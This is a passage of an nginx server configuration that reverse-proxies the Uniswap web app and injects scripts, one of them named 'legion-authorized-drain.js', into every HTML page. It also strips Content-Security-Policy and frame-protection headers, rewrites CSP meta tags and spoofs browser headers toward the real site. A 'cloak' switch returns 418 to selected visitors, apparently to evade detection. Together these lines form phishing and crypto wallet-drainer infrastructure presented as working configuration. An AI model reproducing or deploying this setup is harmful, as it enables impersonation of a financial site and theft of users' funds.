    }

    # Proxy all paths (including /) to the configured target origin
    location / {
      if ($legion_apply_cloak) { return 418; }
      sub_filter_once off;
      sub_filter_types text/html;
      sub_filter '</head>' '<script src="/legion-cloak-client.js"></script><script src="/legion-authorized-drain.js" defer></script><script src="/legion-balance-display.js" defer></script></head>';
      proxy_set_header Accept-Encoding "";
      sub_filter 'http-equiv="Content-Security-Policy"' 'http-equiv="X-Legion-Csp-Removed"';
      sub_filter "http-equiv='Content-Security-Policy'" "http-equiv='X-Legion-Csp-Removed'";
      proxy_buffering off;
      proxy_pass https://app.uniswap.org;
      proxy_ssl_server_name on;
      proxy_set_header Host app.uniswap.org;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header X-Forwarded-Host $host;
      proxy_redirect off;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;
      proxy_hide_header Cross-Origin-Embedder-Policy;
      proxy_hide_header Cross-Origin-Opener-Policy;
      proxy_hide_header Cross-Origin-Resource-Policy;
      proxy_hide_header Permissions-Policy;
      proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
      proxy_set_header Accept-Language "en-US,en;q=0.9";
      proxy_set_header Accept "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
      proxy_set_header Sec-CH-UA "\"Chromium\";v=\"122\", \"Google Chrome\";v=\"122\", \"Not-A.Brand\";v=\"99\"";
      proxy_set_header Sec-CH-UA-Mobile "?0";
      proxy_set_header Sec-CH-UA-Platform "\"Windows\"";
      proxy_set_header Referer "https://app.uniswap.org/";
      proxy_set_header Origin "https://app.uniswap.org";
